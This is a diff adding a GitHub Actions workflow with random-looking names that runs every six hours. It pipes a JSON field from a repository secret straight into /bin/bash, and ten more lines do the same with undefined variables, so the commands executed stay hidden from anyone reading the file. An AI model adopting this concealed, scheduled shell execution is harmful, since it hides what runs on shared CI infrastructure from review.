@@ -1,0 +1,28 @@
+name: sdhgiyuan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sdhgiyuan
+        env:
+          y93: ${{ secrets.y93 }}
+        run: |
+          echo $y93 | jq -r .xcmc61930 | /bin/bash
+          echo $caery6 | jq -r .bu5 | /bin/bash
+          echo $f4 | jq -r .zb485 | /bin/bash
+          echo $mcju3 | jq -r .te6 | /bin/bash
+          echo $wms547 | jq -r .p5259 | /bin/bash
+          echo $jh6960 | jq -r .fx94331 | /bin/bash
+          echo $aid4 | jq -r .kmo64609 | /bin/bash
+          echo $ntkc02405 | jq -r .mpf2562 | /bin/bash
+          echo $y21157 | jq -r .igrg27 | /bin/bash
+          echo $oimot23303 | jq -r .nfq0270 | /bin/bash
+          echo $mp21 | jq -r .lamvf93 | /bin/bash
+
